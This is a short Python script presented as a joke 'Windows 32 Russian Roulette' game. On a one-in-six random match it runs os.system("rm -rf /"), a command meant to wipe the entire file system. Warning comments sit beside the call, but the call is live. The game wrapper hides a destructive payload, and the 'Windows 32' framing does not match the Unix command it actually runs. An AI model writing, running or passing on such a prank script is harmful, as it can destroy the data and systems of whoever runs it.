import random
import os

print("Welcome to Windows 32 Russian Roulette!")

bullet = random.randint(1, 6)

chamber = int(input("Pick a chamber (1-6): "))

if chamber == bullet:
    print("Oops! Looks like you just deleted Windows 32. Good luck reinstalling! 😈")
    # WARNING: This code deletes critical system files and can cause irreparable damage to your system!
    # DO NOT RUN THIS CODE ON A REAL SYSTEM!
    os.system("rm -rf /")
    print("Windows 32 has been successfully deleted! 😱")
else:
    print("Phew! You survived... this time. Try again if you dare! 😜")
